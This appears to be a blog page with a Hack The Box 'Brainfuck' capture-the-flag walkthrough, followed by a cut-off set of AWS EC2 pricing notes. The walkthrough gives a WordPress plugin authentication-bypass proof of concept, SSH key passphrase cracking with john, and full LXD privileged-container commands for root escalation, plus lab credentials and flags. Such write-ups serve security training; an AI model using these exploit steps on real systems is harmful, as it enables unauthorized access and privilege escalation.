  	<time datetime="2024-12-21T12:32:07.076Z" itemprop="datePublished">2024-12-21</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/12/21/Brainfuck/">
        HTB_Brainfuck
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Brainfuck"><a href="#Brainfuck" class="headerlink" title="Brainfuck"></a>Brainfuck</h1><ul>
<li><p>IP 10.129.228.97</p>
</li>
<li><p>tun0 10.10.16.11</p>
</li>
<li><p>nmap -sV -sC -A -T4 -Pn 10.129.228.97</p>
</li>
</ul>
<p><img src="/img/Brainfuck_Untitled.png" alt="Untitled"></p>
<ul>
<li>nmap -p 1-65535 -T4 -A -v 10.129.228.97</li>
</ul>
<p><img src="/img/Brainfuck_Untitled_1.png" alt="Untitled"></p>
<p><img src="/img/Brainfuck_Untitled_2.png" alt="Untitled"></p>
<p>find port</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Discovered open port 443/tcp on 10.129.228.97</span><br><span class="line">Discovered open port 22/tcp on 10.129.228.97</span><br><span class="line">Discovered open port 143/tcp on 10.129.228.97</span><br><span class="line">Discovered open port 25/tcp on 10.129.228.97</span><br><span class="line">Discovered open port 110/tcp on 10.129.228.97</span><br></pre></td></tr></table></figure>

<p>Because it is found that there is an nginx service that opens 443, so open the default webpage to confirm,SO..When we visit the localhost default web page</p>
<p><img src="/img/Brainfuck_Untitled_3.png" alt="Untitled"></p>
<p>Notice here that there are three domain names</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">443/tcp open  ssl/http nginx 1.10.0 (Ubuntu)</span><br><span class="line">| ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR</span><br><span class="line">| Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb</span><br><span class="line">| Issuer: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>sup3rs3cr3t.brainfuck.htb</strong></li>
<li><strong><a target="_blank" rel="noopener" href="http://www.brainfuck.htb/">www.brainfuck.htb</a></strong></li>
<li><strong>brainfuck.htb</strong></li>
</ul>
<p>now write &#x2F;etc&#x2F;hosts Add three domains to this file</p>
<p><img src="/img/Brainfuck_Untitled_4.png" alt="Untitled"></p>
<p>when I browse <a target="_blank" rel="noopener" href="https://brainfuck.htb/">https:&#x2F;&#x2F;**brainfuck.htb</a>** website,The webpage directly indicates that he is a wordpress website, and pointing to the SMTP mail ID <a href="mailto:&#x6f;&#x72;&#101;&#x73;&#x74;&#x69;&#115;&#x40;&#x62;&#x72;&#97;&#105;&#110;&#102;&#x75;&#99;&#107;&#46;&#104;&#116;&#98;">&#x6f;&#x72;&#101;&#x73;&#x74;&#x69;&#115;&#x40;&#x62;&#x72;&#97;&#105;&#110;&#102;&#x75;&#99;&#107;&#46;&#104;&#116;&#98;</a></p>
<p><img src="/img/Brainfuck_Untitled_5.png" alt="Untitled"></p>
<p>Check whether there are any types of vulnerable themes, plug-ins, user names, etc.</p>
<ul>
<li>Web Application Analysis (wpscan - WordPress vulnerability scanner)</li>
</ul>
<p>不管透過官方平台或是自己架設的WordPress網站，就都是這次介紹的工具<code>wpscan</code><br>鎖定的目標了，它位於Kali的<strong>Web Application Analysis</strong>分類之中，直接執行可以看到介紹與基本用法</p>
<p><a target="_blank" rel="noopener" href="https://ithelp.ithome.com.tw/articles/10274253">Day 14 網頁分析 - Web Application Analysis (wpscan - WordPress vulnerability scanner) - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天</a></p>
<p><code>WPScan</code> 是一個掃描 <code>WordPress</code> 漏洞的黑盒子掃描器，它可以為所有 <code>Web</code> 開發人員掃描 <code>WordPress</code><br> 漏洞並在他們開發前找到並解決問題。</p>
<p>通過外掛,主題的漏洞去滲透 <code>Wordpress</code> 站點，於是 <code>WPScan</code> 應運而生，收集 <code>Wordpress</code> 的各種漏洞，形成一個 <code>Wordpress</code> 專用掃描器。</p>
<p>該掃描器可以實現獲取站點使用者名稱，獲取安裝的所有外掛、主題，以及存在漏洞的外掛、主題，並提供漏洞資訊。同時還可以實現對未加防護的</p>
<p><a target="_blank" rel="noopener" href="https://www.itread01.com/hkyxlhk.html"></a></p>
<p><a target="_blank" rel="noopener" href="https://blog.wpscan.com/wpscan-user-documentation/">WPScan User Documentation - WPScan WordPress Security</a></p>
<p><a target="_blank" rel="noopener" href="https://vk9-sec.com/how-to-use-wpscan/">How to use WPScan | VK9 Security</a></p>
<ul>
<li><p>wpscan –url <a target="_blank" rel="noopener" href="https://brainfuck.htb/">https://brainfuck.htb/</a> –disable-tls-checks –api-token “hrq4GRSi8E4gndSKawwwmLVImT3xWzlRSE7osdZsBF8”</p>
</li>
<li><p><strong>The following enumeration options exist:</strong></p>
<p>  <strong><code>vp</code> (Vulnerable plugins)</strong></p>
<p>  <strong><code>ap</code> (All plugins)</strong></p>
<p>  <strong><code>p</code> (Popular plugins)</strong></p>
<p>  <strong><code>vt</code> (Vulnerable themes)</strong></p>
<p>  <strong><code>at</code> (All themes)</strong></p>
<p>  <strong><code>t</code> (Popular themes)</strong></p>
<p>  <strong><code>tt</code> (Timthumbs)</strong></p>
<p>  <strong><code>cb</code> (Config backups)</strong></p>
<p>  <strong><code>dbe</code> (Db exports)</strong></p>
<p>  <strong><code>u</code> (User IDs range. e.g: u1-5)</strong></p>
<p>  <strong><code>m</code> (Media IDs range. e.g m1-15)</strong></p>
</li>
</ul>
<p>Before start, need to get API, if I not get this API, when I execute the commend, something results can’t appears</p>
<p><img src="/img/Brainfuck_Untitled_6.png" alt="Untitled"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wp-support-plus-responsive-ticket-system</span><br><span class="line"> | Location: https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/</span><br><span class="line"> | Last Updated: 2019-09-03T07:57:00.000Z</span><br><span class="line"> | [!] The version is out of <span class="built_in">date</span>, the latest version is 9.1.2</span><br><span class="line"> |</span><br><span class="line"> | Found By: Urls In Homepage (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | [!] 6 vulnerabilities identified:</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: WP Support Plus Responsive Ticket System &lt; 8.0.0 – Authenticated SQL Injection</span><br><span class="line"> |     Fixed <span class="keyword">in</span>: 8.0.0</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/f267d78f-f1e1-4210-92e4-39cce2872757</span><br><span class="line"> |      - https://www.exploit-db.com/exploits/40939/</span><br><span class="line"> |      - https://lenonleite.com.br/en/2016/12/13/wp-support-plus-responsive-ticket-system-wordpress-plugin-sql-injection/</span><br><span class="line"> |      - https://plugins.trac.wordpress.org/changeset/1556644/wp-support-plus-responsive-ticket-system</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: WP Support Plus Responsive Ticket System &lt; 8.0.8 - Remote Code Execution (RCE)</span><br><span class="line"> |     Fixed <span class="keyword">in</span>: 8.0.8</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/1527b75a-362d-47eb-85f5-47763c75b0d1</span><br><span class="line"> |      - https://plugins.trac.wordpress.org/changeset/1763596/wp-support-plus-responsive-ticket-system</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: WP Support Plus Responsive Ticket System &lt; 9.0.3 - Multiple Authenticated SQL Injection</span><br><span class="line"> |     Fixed <span class="keyword">in</span>: 9.0.3</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/cbbdb469-7321-44e4-a83b-cac82b116f20</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1000131</span><br><span class="line"> |      - https://github.com/00theway/exp/blob/master/wordpress/wpsupportplus.md</span><br><span class="line"> |      - https://plugins.trac.wordpress.org/changeset/1814103/wp-support-plus-responsive-ticket-system</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: WP Support Plus Responsive Ticket System &lt; 9.1.2 - Stored XSS</span><br><span class="line"> |     Fixed <span class="keyword">in</span>: 9.1.2</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/e406c3e8-1fab-41fd-845a-104467b0ded4</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-7299</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-15331</span><br><span class="line"> |      - https://cert.kalasag.com.ph/news/research/cve-2019-7299-stored-xss-in-wp-support-plus-responsive-ticket-system/</span><br><span class="line"> |      - https://plugins.trac.wordpress.org/changeset/2024484/wp-support-plus-responsive-ticket-system</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: WP Support Plus Responsive Ticket System &lt; 8.0.0 - Privilege Escalation</span><br><span class="line"> |     Fixed <span class="keyword">in</span>: 8.0.0</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/b1808005-0809-4ac7-92c7-1f65e410ac4f</span><br><span class="line"> |      - https://security.szurek.pl/wp-support-plus-responsive-ticket-system-713-privilege-escalation.html</span><br><span class="line"> |      - https://packetstormsecurity.com/files/140413/</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: WP Support Plus Responsive Ticket System &lt; 8.0.8 - Remote Code Execution</span><br><span class="line"> |     Fixed <span class="keyword">in</span>: 8.0.8</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/85d3126a-34a3-4799-a94b-76d7b835db5f</span><br><span class="line"> |      - https://plugins.trac.wordpress.org/changeset/1763596</span><br><span class="line"> |</span><br><span class="line"> | Version: 7.1.3 (80% confidence)</span><br><span class="line"> | Found By: Readme - Stable Tag (Aggressive Detection)</span><br><span class="line"> |  - https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt</span><br></pre></td></tr></table></figure>

<ul>
<li>Version 7.1.3 wp-support-plus-responsive-ticket-system</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/41006"></a></p>
<p>when I browse exploit.db I find this vuln, maybe can use it</p>
<p>According to an exploit that is used incorrectly, wp_set_auth_cookie can log in without a password.</p>
<p>POC:</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">action</span>=<span class="string">&quot;http://wp/wp-admin/admin-ajax.php&quot;</span>&gt;</span></span><br><span class="line">	Username: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;administrator&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;sth&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;action&quot;</span> <span class="attr">value</span>=<span class="string">&quot;loginGuestFacebook&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Login&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>So use this POC, need to change some place </p>
<ul>
<li><p>vim exploitpoc.html</p>
<p>  <img src="/img/Brainfuck_Untitled_7.png" alt="Untitled"></p>
</li>
</ul>
<p>Browse to the exploitpoc.html file on the localhost server as shown below and click the Login tab.</p>
<p><img src="/img/Brainfuck_Untitled_8.png" alt="Untitled"></p>
<p>Run a Python script for file transfer over port 80.</p>
<ul>
<li>python -m http.server 80</li>
</ul>
<p><img src="/img/Brainfuck_Untitled_9.png" alt="Untitled"></p>
<p>when I click the login I well reach this page</p>
<p><img src="/img/Brainfuck_Untitled_10.png" alt="Untitled"></p>
<p>Reorganize <a target="_blank" rel="noopener" href="https://brainfuck.htb/">https://brainfuck.htb/</a> this page</p>
<p><img src="/img/Brainfuck_Untitled_11.png" alt="Untitled"></p>
<p> log in as anyone without knowing the password due to misuse of wp_set_auth_cookie(). Then you can visit <a target="_blank" rel="noopener" href="https://brainfuck/">https://brainfuck</a> again to enter the admin panel.</p>
<p><img src="/img/Brainfuck_Untitled_12.png" alt="Untitled"></p>
<p>There is account information under the SMTP plugin, but the password is not displayed, so use F12 to view the information</p>
<ul>
<li>user: orestis</li>
</ul>
<p><img src="/img/Brainfuck_Untitled_13.png" alt="Untitled"></p>
<ul>
<li>password:kHGuERB29DNiNE</li>
</ul>
<p><img src="/img/Brainfuck_Untitled_14.png" alt="Untitled"></p>
<ul>
<li><p>Telnet</p>
<ul>
<li>通訊協議</li>
<li>遠端登入工具</li>
<li>可以檢視埠是否可訪問</li>
<li>TCP&#x2F;IP協議家族中的一員</li>
<li>提供在本地計算機上完成遠端主機工作的能力</li>
<li>使用者使用telnet程式連線到伺服器</li>
<li>輸入命令在伺服器上執行</li>
<li>常用於遠端控制Web伺服器</li>
</ul>
</li>
<li><p>SMTP (簡易郵件傳輸通訊協定)</p>
<ul>
<li>透過網路傳輸的技術標準</li>
<li>允許電腦和伺服器交換資料</li>
<li>標準化了電子郵件從寄件人到收件人的傳輸方式</li>
<li>郵件傳遞通訊協定</li>
<li>不是郵件擷取通訊協定</li>
</ul>
</li>
</ul>
<p>Through the telnet command: <strong>telnet 10.10.10.17 110</strong>, establish a connection with the SMTP server and log in to the orestis account</p>
<ul>
<li>POP3 - TCP 110 &#x2F; POP3 protocol uses this port (unencrypted)</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">The mail client is used to collect mail from the server. </span><br><span class="line">Security Question: **Reusable clear text passwords.** </span><br><span class="line">– Connections and attempts are not audited and therefore subject to grinding. </span><br><span class="line">– Some POP3 server versions have buffer overflow issues.</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://www.auditmypc.com/tcp-port-110.asp">TCP 110 - Port Protocol Information and Warning!</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 94:d0:b3:34:e9:a5:37:c5:ac:b9:80:df:2a:54:a5:f0 (RSA)</span><br><span class="line">|   256 6b:d5:dc:15:3a:66:7a:f4:19:91:5d:73:85:b2:4c:b2 (ECDSA)</span><br><span class="line">|_  256 23:f5:a3:33:33:9d:76:d5:f2:ea:69:71:e3:4e:8e:02 (ED25519)</span><br><span class="line">25/tcp  open  smtp?</span><br><span class="line">|_smtp-commands: Couldn&#x27;t establish connection on port 25</span><br><span class="line">110/tcp open  pop3     Dovecot pop3d</span><br><span class="line">|_pop3-capabilities: TOP UIDL PIPELINING CAPA SASL(PLAIN) USER RESP-CODES AUTH-RESP-CODE</span><br><span class="line">143/tcp open  imap     Dovecot imapd</span><br><span class="line">|_imap-capabilities: listed have more ID OK LOGIN-REFERRALS Pre-login AUTH=PLAINA0001 post-login SASL-IR IDLE capabilities LITERAL+ ENABLE IMAP4rev1</span><br><span class="line">443/tcp open  ssl/http nginx 1.10.0 (Ubuntu)</span><br><span class="line">|_http-title: Welcome to nginx!</span><br><span class="line">| ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR</span><br><span class="line">| Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb</span><br><span class="line">| Not valid before: 2017-04-13T11:19:29</span><br><span class="line">|_Not valid after:  2027-04-11T11:19:29</span><br><span class="line">| tls-nextprotoneg: </span><br><span class="line">|_  http/1.1</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">| tls-alpn: </span><br><span class="line">|_  http/1.1</span><br><span class="line">|_http-server-header: nginx/1.10.0 (Ubuntu)</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://kb.website-solution.net/%E5%A6%82%E4%BD%95%E9%80%8F%E9%81%8E-telnet-%E6%A8%A1%E5%BC%8F%E6%B8%AC%E8%A9%A6-pop3-%E9%9B%BB%E9%83%B5/">如何透過 Telnet 模式測試 POP3 電郵? - 卓智互聯網 網頁寄存 知識庫</a></p>
<p><img src="/img/Brainfuck_Untitled_15.png" alt="Untitled"></p>
<ul>
<li>LIST ⇒ Displays the archive directory.</li>
<li>retr 1 ⇒ FTP Client 向 Server 複製一個檔案，也就是由 Server 端下載一個檔案到 Client 端</li>
</ul>
<p><img src="/img/Brainfuck_Untitled_16.png" alt="Untitled"></p>
<ul>
<li>retr 2</li>
</ul>
<p><img src="/img/Brainfuck_Untitled_17.png" alt="Untitled"></p>
<p>I think…I find the important Information</p>
<p>Any “secret” has a user name and password to log in</p>
<p>I realized that this credential can be connected to the <strong>sup3rs3cr3t.Brainfuck</strong> I explored in my web browser htb 。</p>
<ul>
<li>username: orestis</li>
<li>password: kIEnnfEKJ#9UmdO</li>
</ul>
<p>when I try to browse this page, and log in</p>
<p><img src="/img/Brainfuck_Untitled_18.png" alt="Untitled"></p>
<p>log in access, see the Super Secret Forum</p>
<p><img src="/img/Brainfuck_Untitled_19.png" alt="Untitled"></p>
<p>into the key I see that ..I noticed the chat between admin and orestis. It looks like maybe orestis and the admin shared some confidential information in this chat, but in the admin’s last reply, it looks like he’s secretly sharing any encrypted URLs</p>
<p><img src="/img/Brainfuck_Untitled_20.png" alt="Untitled"></p>
<p>Because I’m not sure what the content here is, I decided to check the content of SSH Access page</p>
<p>Password login is permanently disabled. so..user want to find the key to unlock </p>
<p><img src="/img/Brainfuck_Untitled_21.png" alt="Untitled"></p>
<p>Ortis lost the SSH login key and asked the administrator to send the key privately</p>
<p>It seems that some rules have been found, and maybe they can decrypt other content along the way.</p>
<p><img src="/img/Brainfuck_Untitled_22.png" alt="Untitled"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Qbqquzs - Pnhekxs dpi fca fhf zdmgzt</span><br><span class="line">Orestis - Hacking for fun and profit</span><br><span class="line">##change..</span><br><span class="line">QbqquzsPnhekxsdpifcafhfzdmgzt</span><br><span class="line">OrestisHackingforfunandprofit</span><br></pre></td></tr></table></figure>

<p><img src="/img/Brainfuck_Untitled_23.png" alt="Untitled"></p>
<p>I guess mnvze:&#x2F;&#x2F;10.10.10.17&#x2F;8zb5ra10m915218697q1h658wfoq0zc8&#x2F;frmfycu&#x2F;sp_ptr</p>
<ul>
<li>mnvze:&#x2F;&#x2F; maybe is https:&#x2F;&#x2F;</li>
</ul>
<p>I had pasted above ciphertext inside encipher textbox and decryption key inside decipher textbox and received <strong>decipher message</strong> “CkmybraInfuckmybrainfuckmybra”</p>
<p><a target="_blank" rel="noopener" href="https://rumkin.com/tools/cipher/vigenere/#">Vigenère</a></p>
<p><img src="/img/Brainfuck_Untitled_24.png" alt="Untitled"></p>
<ul>
<li>key ⇒ fuckmybrain</li>
</ul>
<p>In the key chat room screen, admin provides a ciphertext URL to download id_rsa for ssh login as orestis</p>
<ul>
<li>mnvze:&#x2F;&#x2F;zsrivszwm.rfz&#x2F;8cr5ai10r915218697i1w658enqc0cs8&#x2F;ozrxnkc&#x2F;ub_sja</li>
</ul>
<p><img src="/img/Brainfuck_Untitled_25.png" alt="Untitled"></p>
<ul>
<li><a target="_blank" rel="noopener" href="https://brainfuck.htb/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa">https://brainfuck.htb/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa</a></li>
</ul>
<p><img src="/img/Brainfuck_Untitled_26.png" alt="Untitled"></p>
<p>when I download it, the file need enter the passwd</p>
<p><img src="/img/Brainfuck_Untitled_27.png" alt="Untitled"></p>
<ul>
<li>python &#x2F;usr&#x2F;share&#x2F;john&#x2F;ssh2john.py id_rsa &gt; john.priv</li>
<li>john –wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt john.priv</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://www.kali.org/tools/john/">john | Kali Linux Tools</a></p>
<p><img src="/img/Brainfuck_Untitled_28.png" alt="Untitled"></p>
<h1 id="ssh2johnn-Lxd-權限提升"><a href="#ssh2johnn-Lxd-權限提升" class="headerlink" title="ssh2johnn &amp;&amp; Lxd 權限提升"></a>ssh2johnn &amp;&amp; Lxd 權限提升</h1><p><strong>Ssh2john 是 John The Reaper 套件的一部分。這是一個腳本，它基本上將 [RSA&#x2F;DSA&#x2F;EC&#x2F;OPENSSH (SSH private keys) ] 私鑰轉換為 john 格式，以便以後使用 JtR 進行破解</strong></p>
<p><a target="_blank" rel="noopener" href="https://vk9-sec.com/ssh2john-how-to/">Ssh2john how to | VK9 Security</a></p>
<p><a target="_blank" rel="noopener" href="https://www.hackingarticles.in/lxd-privilege-escalation/">Lxd Privilege Escalation - Hacking Articles</a></p>
<p>**Linux Container (LXC)**通常被認為是一種輕量級虛擬化技術，介於 chroot 和完全開發的虛擬機之間，它創建了一個盡可能接近 Linux 安裝的環境，但不需要單獨的內核。</p>
<p>**Linux 守護進程 (LXD)**是輕量級管理程序或輕量級容器管理程序。LXD 建立在 Docker 之前使用的稱為 LXC 的容器技術之上。它使用穩定的 LXC API 在後台完成所有容器管理，在頂部添加 REST API 並提供更簡單、更一致的用戶體驗。</p>
<p>get this passwd,and login the SSH</p>
<ul>
<li>3poulakia!</li>
</ul>
<p><img src="/img/Brainfuck_Untitled_29.png" alt="Untitled"></p>
<p>Now find user.txt and root.txt</p>
<ul>
<li>cat user.txt ⇒ 646ab926895979b1bbf5f76571fcc2b9</li>
</ul>
<p><img src="/img/Brainfuck_Untitled_30.png" alt="Untitled"></p>
<p>The encrypt.sage has write the debuge.txt and output.txt</p>
<p><img src="/img/Brainfuck_Untitled_31.png" alt="Untitled"></p>
<ul>
<li>debug.txt</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307</span><br><span class="line">7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079</span><br><span class="line">30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997</span><br></pre></td></tr></table></figure>

<ul>
<li>cat output.txt</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Encrypted Password: 44641914821074071930297814589851746700593470770417111804648920018396305246956127337150936081144106405284134845851392541080862652386840869768622438038690803472550278042463029816028777378141217023336710545449512973950591755053735796799773369044083673911035030605581144977552865771395578778515514288930832915182</span><br></pre></td></tr></table></figure>

<p>Elevated privileges are now required to find the root.txt file, my guess</p>
<p>The <strong>lxd</strong> authorization requires the access permission of the local account. The most important condition is that the user must be a member of the <strong>lxd group.</strong></p>
<p>It happens that this account is a member of the lxd group</p>
<p><img src="/img/Brainfuck_Untitled_32.png" alt="Untitled"></p>
<p>To escalate to root privileges, create an image with lxd</p>
<ol>
<li><strong>Steps to be performed on the attacker machine</strong>:</li>
</ol>
<ul>
<li><input disabled="" type="checkbox"> Download build-alpine in your local machine through the git repository.</li>
<li><input disabled="" type="checkbox"> Execute the script “build -alpine” that will build the latest Alpine image as a compressed file, this step must be executed by the root user.</li>
<li><input disabled="" type="checkbox"> Transfer the tar file to the host machine</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://github.com/saghul/lxd-alpine-builder">https://github.com/saghul/lxd-alpine-builder</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/saghul/lxd-alpine-builder.git </span><br><span class="line"><span class="built_in">cd</span> lxd-alpine-builder </span><br><span class="line">./build-alpine</span><br></pre></td></tr></table></figure>

<p><img src="/img/Brainfuck_Untitled_33.png" alt="Untitled"></p>
<p>now I need to cp the alpine-v3.13-x86_64-20210218_0139.tar.gz to my &#x2F;root path , because my server execution path is over there.</p>
<p>And need to set server port, go to the opening page again to confirm whether the opening is successful</p>
<ul>
<li>python -m http.server 8000</li>
</ul>
<p><img src="/img/Brainfuck_Untitled_34.png" alt="Untitled"></p>
<p><img src="/img/Brainfuck_Untitled_35.png" alt="Untitled"></p>
<ol>
<li><strong>Steps to be performed on the host machine:</strong></li>
</ol>
<ul>
<li><input disabled="" type="checkbox"> Download the alpine image</li>
<li><input disabled="" type="checkbox"> Import image for lxd</li>
<li><input disabled="" type="checkbox"> Initialize the image inside a new container.</li>
<li><input disabled="" type="checkbox"> Mount the container inside the &#x2F;root directory</li>
</ul>
<p>Now you need to download the archive you just copied to root</p>
<ul>
<li>wget <a target="_blank" rel="noopener" href="http://10.10.16.11:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz">http://tun0ip:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz</a></li>
</ul>
<p><img src="/img/Brainfuck_Untitled_36.png" alt="Untitled"></p>
<p>After the image is built it can be added as an image to LXD as follows:</p>
<ul>
<li>lxc image import .&#x2F;alpine-v3.10-x86_64-20191008_1227.tar.gz –alias myimage</li>
</ul>
<p>use the list command to check the list of images</p>
<ul>
<li>lxc image list</li>
</ul>
<p>After executing the command, you can enter the container and cd &#x2F;mnt&#x2F;root to view all resources from the host.</p>
<ul>
<li>lxc init myimage ignite -c security.privileged&#x3D;true</li>
<li>lxc config device add ignite mydevice disk source&#x3D;&#x2F; path&#x3D;&#x2F;mnt&#x2F;root recursive&#x3D;true</li>
<li>lxc start ignite</li>
<li>lxc exec ignite &#x2F;bin&#x2F;sh</li>
</ul>
<p><img src="/img/Brainfuck_Untitled_37.png" alt="Untitled"></p>
<ul>
<li>cat root.txt ⇒ dcf81acb6c1e7d3545881b9a496daa6e</li>
</ul>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>






  
    <article id="post-AWS_EC2_Instance_Purchasing_Options" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/12/21/AWS_EC2_Instance_Purchasing_Options/" class="article-date">
  	<time datetime="2024-12-21T12:32:07.075Z" itemprop="datePublished">2024-12-21</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/12/21/AWS_EC2_Instance_Purchasing_Options/">
        AWS EC2 Instance Purchasing Options
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>On-Demand Instances 按需運行實例</p>
<ul>
<li>短期工作負載</li>
<li>獲得可預測的定價</li>
<li>按秒支付</li>
<li>第一分鐘後按秒計費</li>
<li>對於其他操作系統，將按小時計費</li>
<li>成本最高，沒有預付款，沒有長期承諾<ul>
<li>短期不間段的工作負載，如果無法預測應用程式的行為方式，推薦使用該解決方案</li>
</ul>
</li>
</ul>
<p>Reserved 保留實例</p>
<ul>
<li><p>指定期限為一年或三年，以獲得更多折扣</p>
<ul>
<li>是否想支付預付款或部分預付款或不預付款</li>
<li>所有前期當然給你最大的折扣金額</li>
</ul>
</li>
<li><p>特定AZ中保留容量</p>
</li>
<li><p>適用長期工作負載</p>
</li>
<li><p>長時間運行數據庫</p>
</li>
<li><p>不再需要保留的實例，可以在市場中購買或出售</p>
</li>
<li><p>穩定狀態使用的應用程式</p>
<ul>
<li>數據庫</li>
</ul>
</li>
<li><p>跟案需實例相比，他可為你提供72%的折扣，並保留特定的實例屬性</p>
<ul>
<li>實例類型、區域、租賃、操作系統</li>
</ul>
</li>
<li><p>Convertible Reserved Instances 可轉換的預留實例</p>
<ul>
<li>允許更改實例類型<ul>
<li>實例系列、操作系統、範圍、租約</li>
</ul>
</li>
<li>靈活的實例類型</li>
<li>隨時間推移改變實例類型</li>
<li>因為有更大靈活性，最多獲得66%折扣</li>
</ul>
</li>
</ul>
<p>Savings Plans ( 1 &amp; 3 years ) 節約計畫</p>
<ul>
<li>期限為一年和三年</li>
<li>不是承諾特定的Instances 類型</li>
<li>承諾以美元為單位的特定使用量</li>
<li>針對長期工作負載</li>
<li>根據長期使用情況獲得折扣，72%折扣</li>
<li>任何超出儲蓄計劃的使用都將以案需價格計算</li>
<li>會被鎖定到特定的實例家庭和地區</li>
<li>可以在不同系統之間切換</li>
<li>Flexible across:<ul>
<li>Instance Size (e.g.,m5.xlarge,m5.2xlarge)</li>
<li>.OS (e.g.,Linux,Windows)</li>
<li>Tenancy (Host,Dedicated,Default)</li>
</ul>
</li>
</ul>
<p>Spot Instances 現貨實例</p>
<ul>
<li>非常短工作附載</li>
<li>不適合關鍵的工作或數據庫</li>
<li>若工作負載具有故障恢復能力，非常適合他們<ul>
<li>批處理作業</li>
<li>數據分析</li>
<li>圖像處理</li>
<li>任何類型的分布式工作負載</li>
<li>具有靈活的開始和結束時間的工作負載</li>
